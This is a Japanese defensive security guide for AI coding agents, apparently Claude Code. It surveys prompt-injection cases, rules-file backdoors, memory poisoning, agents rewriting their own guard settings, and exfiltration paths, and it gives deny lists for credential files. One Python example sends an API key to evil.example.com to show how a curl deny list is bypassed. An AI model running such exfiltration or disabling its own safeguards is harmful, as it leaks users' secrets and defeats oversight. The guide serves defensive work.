# セキュリティ設計

AIコーディングエージェントは通常のプログラムと異なり、読み込んだコンテンツが命令として解釈されるリスクがある。エージェントに渡す権限の範囲と、権限を強制するメカニズムの設計がセキュリティの核心である。

*情報確認日: 2026-04-08*

---

## 脅威の全体像

### OWASP Top 10 for LLM Applications 2025

[OWASP LLM Top 10 (2025版)](https://owasp.org/www-project-top-10-for-large-language-model-applications/) はLLMアプリケーション固有の脆弱性上位10件を定義する。コーディングエージェントにとくに関連するのは以下。

| 順位 | 脅威名 | 概要 |
|---|---|---|
| LLM01 | プロンプトインジェクション | 外部コンテンツに埋め込まれた指示がエージェントを操作する |
| LLM06 | 過剰な権限（Excessive Agency） | 必要以上の権限・機能・自律性を持つエージェントが予期しない行動をとる |
| LLM08 | ベクトルおよびエンベディングの脆弱性 | RAG 知識ベースへの汚染（ポイズニング）攻撃 |

### OWASP Top 10 for Agentic Applications（2025年12月）

LLM Top 10とは別に、エージェント固有のリスクを対象とした [OWASP Top 10 for Agentic Applications](https://genai.owasp.org/resource/owasp-top-10-for-agentic-applications-for-2026/) が2025年12月に公開された。100名超の専門家が策定。

主なリスクは「エージェントのゴール奪取（Agent Goal Hijack）」「ツール悪用（Tool Misuse）」「アイデンティティ・権限乱用（Identity & Privilege Abuse）」で、OWASP LLM Top 10のエージェント特化版と位置づけられる。

### Lethal Trifecta（致命的三重苦）

以下の3条件がすべて重なると脆弱性が急激に高まる。

- プライベートデータへのアクセス（メール・DB・ファイル）
- 外部のコンテンツ（PR・issue・外部ドキュメント）
- 外部通信手段の保有（API呼び出し・コメント投稿・ファイル書き込み）

コーディングエージェントはこの3条件をすべて満たしやすい。

---

## 脅威の種類

### 1. プロンプトインジェクション

外部コンテンツ（PR本文・issue・README・コードコメント）に悪意ある指示が埋め込まれ、エージェントが正当な命令として実行してしまう攻撃。

| 種類 | 経路 |
|---|---|
| **直接インジェクション** | ユーザーが悪意あるプロンプトを直接入力する |
| **間接インジェクション** | リポジトリのコード・コメント・ドキュメントに指示が仕込まれる |

間接インジェクションはコーディングエージェントの主要な攻撃経路であり、その脅威分類と実証は [Greshake et al., 2023（arXiv:2302.12173）](https://arxiv.org/abs/2302.12173) が先駆的研究として広く参照されている。

**根本的な対策**: ツールへのアクセス権を最小限にする。アクセス権のないエージェントはインジェクションが成功しても実害がない。なお、Anthropicの研究ではブラウザエージェント（ClaudeがウェブブラウザをComputer Use型で操作するエージェント）に多層防御を施しても、成功率を **1.4%** までしか抑えられなかった（[Anthropic Research, 2025-11](https://www.anthropic.com/research/prompt-injection-defenses)）。防御を施しても一定割合は通過する。

実証事例

- **GitHub Copilot（[CVE-2025-53773](https://nvd.nist.gov/vuln/detail/CVE-2025-53773)、CVSS 7.8 HIGH）** — コードコメントにインジェクションを埋め込み、`.vscode/settings.json`の`chat.tools.autoApprove`を書き換えてYOLOモードを有効化する攻撃が実証された。任意コード実行まで至る攻撃チェーンが確認されている（発見: [Embrace The Red](https://embracethered.com/blog/posts/2025/github-copilot-remote-code-execution-via-prompt-injection/) / [Persistent Security](https://www.persistent-security.net/post/part-iii-vscode-copilot-wormable-command-execution-via-prompt-injection)）。**修正済み**: 2025-08-12パッチ適用
- **Microsoft 365 Copilot（[CVE-2025-32711](https://www.catonetworks.com/blog/breaking-down-echoleak/)、CVSS 9.3）** — 細工したメール1通だけでユーザー操作なしに組織内の機密データを窃取できる**ゼロクリック**脆弱性（EchoLeak）。当時はじめて報告されたゼロクリックAIエージェント脆弱性として注目された（発見: Aim Labs、2025年6月）。**修正済み**: 2025年5月にMicrosoftがサーバーサイドで修正（クライアント対応不要）
- **GitHub Copilot Chat（CamoLeak、CVSS 9.6）** — GitHubのCamo画像プロキシを悪用したCSPバイパスとリモートプロンプトインジェクションの組み合わせで、プライベートリポジトリのソースコードとシークレットを窃取（[Legit Security, 2025-10](https://www.legitsecurity.com/blog/camoleak-critical-github-copilot-vulnerability-leaks-private-source-code)）。**修正済み**: 2025-08-14にGitHubがCopilot Chatの画像レンダリング機能を無効化
- **Cursor の自動実行モード** — インジェクション成功率が攻撃手法によって41〜84%に達したとの報告あり（出典: [arXiv:2509.22040](https://arxiv.org/abs/2509.22040) "Your AI, My Shell"）。特定のバージョンの脆弱性ではなく自動実行モード全般の設計上のリスクのため、モードを有効にする際は注意が必要

### 2. 過剰な権限（Excessive Agency）

エージェントが広範なアクセス権を持つと、インジェクション成功時の被害が拡大する。allowリスト・hooks・denyといったアクセス制御の仕組みは「このコマンドは許可されているか」を判定できても、「この実行がユーザーの正当な指示によるものかインジェクションによるものか」は区別できない。OWASPは過剰権限の根本原因を3つに分類している。

- **過剰な機能** — タスクスコープを超えるツールにアクセスできる
- **過剰な権限** — ツールが必要以上に広い権限で動作する
- **過剰な自律性** — 高インパクトな操作が人間確認なしに進む

対策
- `settings.json`のallowリストで最小限のコマンドのみを許可する（Layer 1）
- hooksで破壊的操作をask / denyする（Layer 2）
- sandboxのネットワーク許可リストで外部通信先を制限する（§7参照）
- 認証情報ディレクトリ（`~/.ssh/`・`~/.aws/`等）をdenyで明示的にブロックする
- `--dangerously-skip-permissions`フラグはすべての権限設定を無効化するため、`disableBypassPermissionsMode: "disable"`でフラグ自体の使用を禁止する
- Plan Modeで破壊的操作の前に内容を確認する習慣をつける

### 3. MCP サプライチェーン攻撃

Model Context Protocol（MCP）サーバーはAIエージェントと外部システムを仲介するため、攻撃者の侵入口になりうる。

- **コミュニティ MCP サーバーのリスク** — 誰でも数時間でMCPサーバーを公開できる。審査なしに公開されたサードパーティ製MCPサーバーを企業環境に組み込むと、コード内容が不明なサーバーはAIエージェントと社内システムの間に入り込み、通信内容の盗取や任意コード実行が可能な状態になる
- **実在の攻撃事例（2025年9月）** — Postmarkを装った偽造MCPサーバーがnpmに公開され、1,500ダウンロード/週を記録。15バージョンにわたって正規ツールとして機能したのち、1行のコード変更で通信内容を窃取し始めた（[SC Media](https://www.scworld.com/feature/mcp-servers-emerge-as-new-supply-chain-risk-as-real-attacks-accelerate)）
- **[CVE-2025-6514](https://checkmarx.com/zero-post/11-emerging-ai-security-risks-with-mcp-model-context-protocol/)** — MCPクライアントへの大規模RCE攻撃。認証情報のダンプ・ソースファイル改ざん・バックドア設置が確認された
- **OWASP MCP Top 10** — [owasp.org/www-project-mcp-top-10](https://owasp.org/www-project-mcp-top-10/) にMCP固有のセキュリティリスクが整理されている

対策
- 利用するMCPサーバーのソースコードをGitHubで確認し、公開者・コミット履歴・依存関係に不審な点がないか確認する
- `package.json`のscriptsやpostinstallに意図しない外部通信・ファイル操作が含まれていないか確認する
- MCPサーバーはsandboxのネットワーク許可リストで通信先を制限する（§6参照）
- 本番環境では公式または組織内で審査済みのMCPサーバーのみを使用する

### 4. ルールファイルバックドア（Rules File Backdoor）

[Pillar Security, 2025年3月](https://www.pillar.security/blog/new-vulnerability-in-github-copilot-and-cursor-how-hackers-can-weaponize-code-agents)が報告した攻撃手法。`.cursorrules`や`.claude/settings.json`等の設定ファイルにUnicodeの不可視文字を使って悪意ある指示を埋め込む。エージェントはその指示を読めるが、人間のコードレビューでは見えないため見逃されやすい。生成コードにバックドアを仕込んだりシークレットを外部送信したりする指示が典型的なペイロード。リポジトリのフォーク経由でサプライチェーン全体に伝播する。GitHubは2025年5月に警告機能を追加した。

対策
- 外部リポジトリのルールファイル（`.claude/settings.json`・`.cursorrules`等）を開く前に`cat -v <file>`または`hexdump -C <file>`でUnicode不可視文字が含まれていないか確認する
- 自プロジェクトの`.claude/settings.json`への書き込みを`ask`にする（§6ガードの無効化参照）
- GitHubの[隠しUnicode警告機能](https://github.blog/changelog/2025-05-01-github-now-provides-a-warning-about-hidden-unicode-text/)（2025年5月追加）はプラットフォームレベルで自動適用されるため、設定不要。ただしマージをブロックするものではなく、ファイル表示時のバナー警告にとどまる

### 5. メモリポイズニング

エージェントの長期記憶に虚偽・悪意ある情報を注入する攻撃。通常のプロンプトインジェクションと異なり、セッションを超えて持続するのが最大の特徴。

- **MINJA（Memory Injection Attack）** — クエリのみを通じて長期記憶を汚染する手法。インジェクション成功率95%超、攻撃成功率70%超が報告されている（[arXiv:2601.05504](https://arxiv.org/abs/2601.05504)）
- **MemoryGraft** — エージェントの「成功体験の模倣傾向」を悪用し、過去の成功体験として偽の記憶を植え付ける間接攻撃（[arXiv:2512.16962](https://arxiv.org/html/2512.16962v1)）
- **Claude Code での現状** — 長期メモリ機能（`~/.claude/projects/*/memory/`等）はユーザーが直接管理する。組み込みのポイズニング対策はないため、運用でカバーする必要がある
  - `~/.claude/`以下のメモリファイルを定期的に確認・不審なエントリを削除する
  - 長期メモリを有効にしている場合、外部リポジトリを扱った後に内容を確認する
- **研究レベルの防御手法** — 信頼スコアリング付きの記憶取得・時間的減衰フィルタリング・暗号的来源証明（Cryptographic Provenance Attestation）が研究されているが、Claude Codeには現時点で未実装

対策
- `~/.claude/`以下のメモリファイルを定期的に確認し、不審なエントリ（見覚えのない指示・外部URLへの参照など）を削除する
- 外部リポジトリを扱った後は、メモリファイルの差分を確認する
- メモリファイルをgit管理下に置き、予期しない変更を検知できるようにする
- 不審なエントリを発見した場合はセッションを終了し、メモリファイルを全件確認してから再開する
- cronで定期的にメモリファイルを削除し、汚染が蓄積しないようにする

```bash
# 設定（crontab -e で追加）
# 毎週日曜0時に14日以上経過したメモリファイルを削除
0 0 * * 0 find ~/.claude/projects -path "*/memory/*.md" -mtime +14 -delete

# 現在の設定を確認
crontab -l

# 保持期間を変更する（例: 7日に変更）
# crontab -e を開いて -mtime +14 を -mtime +7 に書き換える

# 無効化する（該当行だけ削除）
crontab -l | grep -v "claude/projects.*memory" | crontab -
```

保持期間の目安: セキュリティを優先するなら7日、プロジェクトの継続性を重視するなら14〜30日。外部リポジトリを頻繁に扱う場合は短めに設定する。

### 6. ガードの無効化

hooksスクリプトや`settings.json`が書き換えられると、すべての防御が無効化される。

想定される起点
- **間接プロンプトインジェクション** — PR本文・issueコメント・外部READMEに埋め込まれた指示がClaude Codeに「`settings.json`を書き換えろ」と命令する。攻撃者はローカルマシンへのアクセス権を持たなくてよい。もっとも現実的な経路
- **コミットアクセスによる事前埋め込み** — リポジトリへの書き込み権限を持つ攻撃者が`.claude/settings.json`に悪意あるhooksを仕込んでおき、別の開発者がそのリポジトリをClaude Codeで開いたときに実行される（CVE-2025-59536の手口）
- **MCPサーバー経由** — 侵害されたMCPサーバーのレスポンスに設定変更の指示が含まれる

対策
- hooksとsettingsへの書き込みに`ask`を設定する（カナリア）。カナリアとは「いつもは確認が来るのに今回は来なかった」という異常の不在でガード無効化を検知する設計パターン。`ask`自体も書き換えられると無効になるため、完全な保護ではなく可視性の向上として捉える

対策にならないアプローチ
- **`chmod 444`による書き込み禁止** — Claude CodeはBashツールで`chmod`を実行できるため、侵害されたセッション自身が`chmod 644`→書き換え→`chmod 444`を一連で実行できる。また正当な更新のたびに手動で権限を戻す必要があり、戻し忘れると保護が解除されたまま放置される
- **git管理** — 変更の事後検知はできるが書き込みを防げない点はカナリアと同等。通常のプロジェクト運用ですでに行われているため、追加の対策としての効果は薄い

### 7. データ持ち出し（Exfiltration）

インジェクション経由で秘密情報が外部に送られるリスク。`gh pr comment`や`gh api`のPOST経由でコードや環境変数を書き出せる経路がある。

対策
- `.env`・秘密鍵・証明書へのRead/Edit/WriteをPermissionsのdenyでブロックする（Readも拒否することでインジェクション経由の漏洩を防ぐ）
- `gh secret set/delete`をdenyでブロックする（読み取ったファイル内容をシークレット値としてGitHubへ送信する経路になる。`delete`は既存のシークレットを削除してCI/CDの認証を壊す）
- `gh`に限らず、シークレット管理CLIの書き込みサブコマンドも同様にdenyの対象にする

| カテゴリ | コマンド例 |
|---|---|
| パスワードマネージャー | `op item edit`・`bw item edit` |
| クラウド | `aws secretsmanager put-secret-value`・`gcloud secrets versions add`・`vault kv put` |
| シークレット管理SaaS | `doppler secrets set`・`infisical secrets set` |
| フロントエンド向けPaaS | `vercel env add`・`netlify env:set`・`firebase functions:config:set`・`supabase secrets set` |
- `gh api`の書き込みメソッドをaskにする
- シークレット自体を暗号化する（denyをすり抜けても平文が渡らないようにする多層防御）

| ツール | 概要 |
|---|---|
| [dotenvx](https://dotenvx.com/) | `.env`ファイルの値を公開鍵暗号で暗号化する。読み取られても`encrypted:BEiSZ...`形式の暗号文のみ取得される。復号には別管理のDOTENV_PRIVATE_KEYが必要 |
| [SOPS](https://github.com/getsops/sops) | YAML/JSON/ENV等を対象にage・PGP・AWS KMS等で暗号化する。Terraformとの親和性が高い |
| [1Password CLI](https://developer.1password.com/docs/cli/) / [Bitwarden CLI](https://bitwarden.com/help/cli/) | シークレットをファイルに書かずCLIで実行時に注入する。`.env`ファイル自体を持たない設計が可能 |

curl/wget を禁止しても迂回される: `curl`や`wget`をdenyしていても、`python3`や`node`が許可されていればHTTP通信で外部にシークレットを送信できる。

```python
# curl/wget を禁止していても python3 が許可されていれば外部送信できる
import urllib.request, os
urllib.request.urlopen(f"https://evil.example.com/{os.environ.get('API_KEY')}")
```

たとえば`python3*`・`node*`・`curl*`・`wget*`をdenyする方法もあるが、`ruby`・`php`・`perl`・`go run`・`deno`・`bun`・`swift`等HTTP通信が可能なランタイムは事実上列挙しきれない。また`bash`の`/dev/tcp`のように外部コマンドを使わずに通信できる手段もある。denyリストはコマンド名でマッチするため新しいツールが登場するたびに後追いとなり、常に抜け穴が残る。

加えて`node*`をdenyするとNode.js上で動作するすべてのツール（webpack・vite・ESLint・Prettier・Jest・Vitest等）が実行不能になる。`python3*`をdenyするとネイティブアドオンのビルドに使われる`node-gyp`やPythonベースのgit hooks・pre-commitフレームワークが壊れる。

より実践的な対策はsandboxのネットワーク許可リストを使うことである（[Anthropic Engineering](https://www.anthropic.com/engineering/claude-code-sandboxing)）。

```json
{
  "sandbox": {
    "enabled": true,
    "network": {
      "allowedDomains": ["github.com", "*.npmjs.org", "api.anthropic.com", "localhost"]
    }
  }
}
```

許可リストに含まれないドメインへの通信はブロックされる。`python3`等のランタイムをdenyする代わりに通信先を制限するため、ビルド・テストへの副作用が小さい。`allowedDomains`は全スコープでマージされる（上書きではなく結合）。ワイルドカード（`*.npmjs.org`等）が使用可能。

対応環境
- macOS — OS内蔵のSeatbeltで動作。追加インストール不要
- Linux / WSL2 — bubblewrapのインストールが必要（`sudo apt-get install bubblewrap socat`等）
- WSL1 / ネイティブWindows — 非対応

制約
- 通信先ドメインを制御するが、通信内容は検査しない。許可済みドメイン（`github.com`等）経由のデータ持ち出しはブロックされない。軽減策として、秘密ファイルへのReadをPermissionsでdenyしておくことで、持ち出し経路が残っても平文が渡らないようにできる
- ドメインフロンティングによるフィルタリング回避の可能性がある（[公式ドキュメント](https://code.claude.com/docs/en/sandboxing)に記載）
- `Read`・`Edit`・`Write`ツールはsandbox対象外。ファイルアクセスはPermissionsで別途制御する

#### PRコメント・レビュー経由の持ち出し

PRへのコメント投稿やレビュー送信をallowにすると、コメント本文にファイル内容や環境変数の値を埋め込んで書き出す経路が残る。askに変更すればPR送信前に確認できるが、PR対応のたびに承認が必要になりワークフローが滞る。プライベートリポジトリが対象であれば攻撃者のアクセス権が必要なためリスクは限定的だが、ブロックしきれない経路として意識しておく必要がある。`.env`等の秘密ファイルへのReadをdenyしておくことが最後の防衛線になる。

疑わしいパターン: 以下を含む外部コンテンツ（CLAUDE.md・MCP設定・リポジトリのコード）はとくに注意する。

| パターン | リスク |
|---|---|
| Base64 エンコードされた文字列 | URL やコマンドが隠されている可能性がある |
| `curl`/`wget`/HTTP リクエストを含む設定 | 外部への情報送信経路になりうる |
| `$HOME`・`$API_KEY`等の環境変数参照 | シークレットを読み取る操作の可能性がある |
| `ANTHROPIC_BASE_URL`の変更 | Claude Code の通信先を偽サーバーに向ける攻撃（API キーが第三者サーバーに送信される） |


### 8. Claude Code 固有の脆弱性（hooks ファイル自体の攻撃）

hooksが強力であることは、同時に攻撃ベクターになるリスクも意味する。

Check Point ResearchはClaude Codeに次の2件の脆弱性を発見・報告している（[研究レポート](https://research.checkpoint.com/2026/rce-and-api-token-exfiltration-through-claude-code-project-files-cve-2025-59536/)）。

| CVE | 深刻度 | 内容 | 修正バージョン |
|---|---|---|---|
| **CVE-2025-59536**（CVSS 8.7 HIGH） | リモートコード実行 | `.claude/settings.json`の hooks に悪意あるコマンドを埋め込んだリポジトリをクローンして開くだけで任意コマンドが実行される | v1.0.111で修正済み |
| **CVE-2026-21852**（CVSS 5.3 MEDIUM） | 情報漏洩 | 悪意あるリポジトリのロード時に Anthropic API キーが漏洩する | v2.0.65以降で修正済み |

対策
- `.claude/settings.json`はコミットアクセスがある人物なら誰でも変更できる。外部リポジトリを開く前に必ず`cat .claude/settings.json`でhooksの内容を確認する
- バージョンを最新に保つ（[バージョン管理](#バージョン管理)参照）

---

## 防御の3層構造

| 層 | 実装 | 役割 | 破られる条件 |
|---|---|---|---|
| Layer 1 | `settings.json` permissions | allow / deny の宣言的制御 | `settings.json`自体が書き換えられる・`--dangerously-skip-permissions`で無効化される |
| Layer 2 | Hooks（PreToolUse） | スクリプトによる動的制御（ask / deny） | hooksスクリプト自体が書き換えられる |
| Layer 3 | 運用ルール | hooks でカバーできない領域（意識・習慣） | 人間が確認を怠る |

各層は独立して機能し、1層が破られても次の層が防御する。Layer 1・2は技術的制御であり自動で機能するが、allowリストに含まれる操作（PRコメント等）や設定ファイル自体の改ざんはカバーできない。Layer 3はその隙間を人間が埋める層であり、最後の防衛線は人間による目視確認である。

- `git diff` — コミット前の変更差分を確認し、意図しないファイル変更を検知する
- 外部リポジトリのルールファイル確認 — クローン前に`.claude/settings.json`等の内容を確認する
- PRコンテンツの確認 — `gh pr diff`・`gh issue view`で取得したコンテンツに不審な指示が含まれていないか意識する
- メモリファイルの確認 — 外部リポジトリを扱った後に`~/.claude/`以下の内容を確認する

3層が同時に機能している状態が前提であり、どれか1層に依存する設計は避ける。

---

## Layer 1: permissions（settings.json）

### allow（自動許可）の判断基準

読み取り専用・副作用なし・実害のない操作のみ許可する。

allowはコマンドの実行を許可するだけであり、その出力が信頼できることを意味しない。`gh api graphql*`の実行をallowしていても、GraphQLレスポンスにインジェクションが含まれる可能性はある（Layer 3「攻撃ベクター」を参照）。

ワイルドカード（`*`）の使いすぎに注意する。意図しないコマンドまで許可してしまう可能性がある。

| パターン | 意図 | 問題 | 修正 |
|---|---|---|---|
| `Bash(gh f*)` | gh-f拡張のみ許可 | `gh fork`にも誤マッチする | `Bash(gh f)`（完全一致） |
| `Bash(gh s*)` | gh-s拡張のみ許可 | `gh secret`にも誤マッチする | `Bash(gh s)`（完全一致） |

allowを追加するときは、そのパターンが想定外のサブコマンドにマッチしないか確認する。

| カテゴリ | 例 | 許可の理由 |
|---|---|---|
| GitHub 読み取り | `gh pr list/view/diff/checks/status` | 読み取り専用。副作用なし |
| ローカル Git 操作 | `gh pr checkout` | ローカルブランチのみ。リモートに影響しない |
| PR コメント・レビュー | `gh pr comment/review` | 副作用あり（書き込み）。コメント本文経由のデータ持ち出しリスクが残る受容リスク |
| リポジトリ閲覧 | `gh repo view/list`, `gh issue list/view` | 読み取り専用 |
| CI 確認 | `gh run list/view` | CI 結果の読み取りのみ |
| GitHub API | `gh api repos*`, `gh api graphql*` | GET を想定。書き込みメソッド（`-f`/`--method POST`等）はhooksで別途制御 |
| 通知・検索 | `gh notify*`, `gh search*` | 読み取り専用 |
| gh 拡張 | `gh dash*`, `gh f`（完全一致）, `gh s`（完全一致） | 読み取り専用。`gh f*`・`gh s*`はワイルドカードを使わず完全一致で書く（§ワイルドカードの注意参照） |
| Git 読み取り | `git log/status/diff/show/remote/stash list` | 読み取り専用 |
| 静的解析 | `madge`, `knip`, `depcruise`, `semgrep`, `type-coverage` | ファイルを変更しない |
| ファイル検索 | `fd`, `tree` | 検索のみ |
| 検証ツール | `html-validate`, `axe`, `wallace`, `colorguard` | 検証のみ |

### deny（常にブロック）の判断基準

| コマンド | 理由 |
|---|---|
| `Glob(**/.env*)` / `Read(**/.env*)` / `Edit(**/.env*)` / `Write(**/.env*)` | `.env`には秘密情報が含まれる。読み取りも拒否してインジェクション経由の漏洩を防ぐ。`**/`パターンでサブディレクトリ（モノレポの`apps/web/.env`等）もカバー。`Glob`を禁止しないとファイルの存在自体が漏れる |
| `Bash(cat **/.env*)` | BashサブプロセスはRead denyの対象外のため個別にブロックが必要（[§permissions.deny の注意点](#permissionsdeny-の注意点)参照）|
| `Read(~/.ssh/*)` / `Bash(cat ~/.ssh/*)` | SSH 秘密鍵へのアクセス。インジェクション成功時の窃取経路を断つ |
| `Read(~/.aws/*)` / `Bash(cat ~/.aws/*)` | AWS クレデンシャルへのアクセス |
| `Read(~/.gcloud/*)` / `Read(~/.config/gcloud/*)` | Google Cloud認証情報・サービスアカウントキー |
| `Read(~/.azure/*)` | Azure CLI認証情報 |
| `Read(~/.kube/config)` | Kubernetesクラスターへの認証情報 |
| `Read(~/.docker/config.json)` | Dockerレジストリの認証情報 |
| `Read(~/.npmrc)` | npmレジストリの認証トークン |
| `Read(~/.netrc)` | 汎用のホスト別認証情報 |
| `Read(~/.config/gh/*)` / `Bash(cat ~/.config/gh/*)` | GitHub 認証トークンへのアクセス |
| `Bash(security find-generic-password*)` | macOS キーチェーンからパスワードを読み取るコマンド |
| `gh repo delete*` | リポジトリ削除は取り消し不可。誤操作・攻撃の被害が最大級 |
| `gh secret set/delete/remove*` | シークレットの書き込み・削除は直接的なセキュリティリスク |
| `gh api --method DELETE*` / `gh api -X DELETE*` | GitHub API 経由の DELETE はリソース削除につながる |
| `npm/pnpm/yarn publish*` | パッケージ公開は取り消しが困難。意図しない公開はサプライチェーン攻撃になりうる |

### disableBypassPermissionsMode

`--dangerously-skip-permissions`フラグは権限確認ダイアログをすべてスキップしてエージェントを実行するオプション。CI・自動化での利用を想定しているが、このフラグが有効だと`settings.json`の`permissions.deny`を含むすべての権限制限が無効になる。

`disableBypassPermissionsMode: "disable"`を設定するとフラグの使用そのものを禁止できる。

```json
{
  "permissions": {
    "disableBypassPermissionsMode": "disable"
  }
}
```

`~/.claude/settings.json`（グローバル設定）に記述するとローカルの全プロジェクトに適用できる。`--dangerously-skip-permissions`が有効な環境ではすべての権限制限が無効になる。CVE-2025-59536のような攻撃チェーン（悪意ある`.claude/settings.json`を含むリポジトリをクローンして開くだけでhooksが実行される）と組み合わさると、任意コマンドが確認なしに無制限実行されるリスクがある。

### permissions.deny の注意点

`permissions.deny`のRead/Editルールは、Claudeの組み込みファイル操作ツールに対してのみ適用される。ReadツールはブロックできるがBashサブプロセス経由（`cat .env`・`grep`等）はブロックできない。公式ドキュメントには次のように明記されている。

> Read and Edit deny rules apply to Claude's built-in file tools, not to Bash subprocesses. A `Read(./.env)` deny rule blocks the Read tool but does not prevent `cat .env` in Bash. For OS-level enforcement that blocks all processes from accessing a path, enable the sandbox.
>読み取り（Read）および編集（Edit）の拒否ルールは、Claudeに組み込まれているファイル操作ツールに対して適用されるものであり、Bashサブプロセスには適用されません。例えば、Read(./.env)の拒否ルールを設定しても、Readツールによる読み取りはブロックされますが、Bash上で「cat .env」を実行することは防げません。すべてのプロセスに対して特定のパスへのアクセスをOSレベルで制限したい場合は、サンドボックスを有効にしてください。
> — [Configure permissions - Claude Code Docs](https://code.claude.com/docs/en/permissions)

`.claudeignore`はClaude Codeの正式機能ではない。Anthropicコラボレーターが「そのファイルを読み込むコードは存在しない」と明言しており（[Issue #33476](https://github.com/anthropics/claude-code/issues/33476)）、正式な代替手段は`settings.json`の`permissions.deny`である。


### 設定例（最小構成のサンプル）

以下はセキュリティの核心部分のみを抜粋した最小構成例。プロジェクトで使うコマンドに合わせてallowを追加する。

```json
{
  "permissions": {
    "allow": [
      "Bash(gh pr list*)", "Bash(gh pr view*)", "Bash(gh pr diff*)",
      "Bash(gh pr checks*)", "Bash(gh pr status*)", "Bash(gh pr checkout*)",
      "Bash(gh pr comment*)", "Bash(gh pr review*)",
      "Bash(gh repo view*)", "Bash(gh repo list*)",
      "Bash(gh api repos*)", "Bash(gh api notifications*)",
      "Bash(gh api graphql*)", "Bash(gh api user*)",
      "Bash(gh issue list*)", "Bash(gh issue view*)",
      "Bash(gh run list*)", "Bash(gh run view*)",
      "Bash(git log*)", "Bash(git status*)", "Bash(git diff*)",
      "Bash(git show*)", "Bash(git remote*)", "Bash(git stash list*)",
      "Bash(git branch --show-current*)"
    ],
    "deny": [
      "Glob(**/.env*)",
      "Read(**/.env*)", "Edit(**/.env*)", "Write(**/.env*)",
      "Bash(cat **/.env*)",
      "Read(~/.ssh/*)", "Bash(cat ~/.ssh/*)",
      "Read(~/.aws/*)", "Bash(cat ~/.aws/*)",
      "Read(~/.gcloud/*)", "Bash(cat ~/.gcloud/*)",
      "Read(~/.config/gcloud/*)", "Bash(cat ~/.config/gcloud/*)",
      "Read(~/.azure/*)", "Bash(cat ~/.azure/*)",
      "Read(~/.kube/config)", "Bash(cat ~/.kube/config)",
      "Read(~/.docker/config.json)", "Bash(cat ~/.docker/config.json)",
      "Read(~/.npmrc)", "Bash(cat ~/.npmrc)",
      "Read(~/.netrc)", "Bash(cat ~/.netrc)",
      "Read(~/.config/gh/*)", "Bash(cat ~/.config/gh/*)",
      "Bash(security find-generic-password*)",
      "Bash(gh repo delete*)",
      "Bash(gh secret set*)", "Bash(gh secret delete*)", "Bash(gh secret remove*)",
      "Bash(gh api --method DELETE*)", "Bash(gh api -X DELETE*)",
      "Bash(npm publish*)", "Bash(pnpm publish*)", "Bash(yarn publish*)", "Bash(bun publish*)"
    ],
    "disableBypassPermissionsMode": "disable"
  }
}
```

allow

- `gh pr *` / `gh repo view/list` / `gh issue *` / `gh run *` — 読み取り専用。副作用なし（[allow の判断基準](#allow自動許可の判断基準)参照）
- `gh pr comment*` / `gh pr review*` — 書き込みを伴うが、PR対応に必要な操作として許可。コメント本文経由のデータ持ち出しリスクが残る受容リスク（[PRコメント経由の持ち出し](#prコメントレビュー経由の持ち出し)参照）
- `gh api graphql*` — GET系クエリを想定。書き込みmutation（`-f`/`--method POST`等）はhooksで別途制御
- `git log/status/diff/show/remote/stash list/branch` — 読み取り専用

deny

- `Glob(**/.env*)` / `Read(**/.env*)` / `Edit(**/.env*)` / `Write(**/.env*)` — `.env`には秘密情報が含まれる。ReadもdenyしてPRコメント経由の漏洩を防ぐ（[§7 データ持ち出し](#7-データ持ち出しexfiltration)参照）。`**/`パターンでサブディレクトリもカバー。`Glob`禁止でファイルの存在自体の漏洩も防ぐ
- `Bash(cat **/.env*)` — BashサブプロセスはRead denyの対象外のため個別にブロック
- `Read(~/.ssh/*)` / `Bash(cat ~/.ssh/*)` — SSHキー。読む正当な理由がない。hooksが破られても守られるべきためpermissions denyに置く
- `Read(~/.aws/*)` — AWSクレデンシャル。同上
- `Read(~/.gcloud/*)` / `Read(~/.config/gcloud/*)` — Google Cloud認証情報・サービスアカウントキー。同上
- `Read(~/.azure/*)` — Azure CLI認証情報。同上
- `Read(~/.kube/config)` — Kubernetesクラスターへの認証情報。同上
- `Read(~/.docker/config.json)` — Dockerレジストリの認証情報。同上
- `Read(~/.npmrc)` — npmレジストリの認証トークン。同上
- `Read(~/.netrc)` — 汎用のホスト別認証情報。同上
- `Read(~/.config/gh/*)` — GitHub認証トークン。同上
- `Bash(security find-generic-password*)` — macOSキーチェーンからパスワードを読み取るコマンド。同上
- `gh repo delete*` — 取り消し不可。被害が最大級
- `gh secret set/delete/remove*` — シークレット管理CLIはデータ持ち出しの経路になる（[§7](#7-データ持ち出しexfiltration)参照）
- `gh api --method DELETE*` / `gh api -X DELETE*` — API経由のリソース削除
- `npm/pnpm/yarn/bun publish*` — 意図しない公開はサプライチェーン攻撃になりうる（[deny の判断基準](#deny常にブロックの判断基準)参照）

`disableBypassPermissionsMode: "disable"` — `--dangerously-skip-permissions`フラグによるすべての権限制限の無効化を禁止する（[disableBypassPermissionsMode](#disablebypasspermissionsmode)参照）

### 設定の書き先

- `~/.claude/settings.json`（ユーザースコープ）: 全プロジェクトに適用したいdenyルール（`.env`・認証情報ディレクトリの保護、`disableBypassPermissionsMode`等）
- `.claude/settings.json`（プロジェクトスコープ）: プロジェクト固有のallow・denyルール

同じ設定が両方に存在する場合、プロジェクト設定がユーザー設定を上書きする（より具体的なスコープが優先）。ただしhooksはマージされる（上書きではなく両方実行）。

---

## Layer 2: Hooks（PreToolUse）

hooksはpermissionsより細かい制御ができる。スクリプトで動的に判断し、`ask`（ユーザー確認）または`deny`（実行拒否）を返す。

hookはイベントの種類ごとに登録する。セキュリティ用途で使うイベントは主に次のとおり（全イベントは[公式ドキュメント](https://code.claude.com/docs/en/hooks)参照）。

| イベント | 発火タイミング | ブロック可否 |
|---|---|---|
| `PreToolUse` | ツール実行直前 | 可 |
| `PostToolUse` | ツール実行成功後 | 不可（監査ログ用途） |
| `UserPromptSubmit` | ユーザーがプロンプトを送信後・Claude処理前 | 可 |
| `SessionStart` | セッション開始・再開時 | 不可 |
| `ConfigChange` | 設定ファイル変更時 | 可 |
| `Stop` | Claudeの応答完了時 | 可 |

防御にはツール実行前のタイミングが唯一有効である。`PostToolUse`は実行後のため、すでに変更・送信が完了した状態であり、ブロックできない。`PreToolUse`で止めることが操作の取り消しを不要にする唯一の手段であるため、このドキュメントでのhooks設計は`PreToolUse`を中心に据える。

マッチャーとは、`PreToolUse`・`PostToolUse`で「どのツール呼び出しに対してhookを実行するか」を絞り込む条件である。同じマッチャーに複数のhookを登録すると並列実行される。

| 指定方法 | 例 | 意味 |
|---|---|---|
| 単一ツール名 | `Bash` | Bashツールのみ |
| OR結合 | `Edit\|Write` | EditまたはWrite |
| 全マッチ | `*`（省略も可） | すべてのツール |
| MCPツール | `mcp__memory__.*` | memoryサーバーの全ツール |

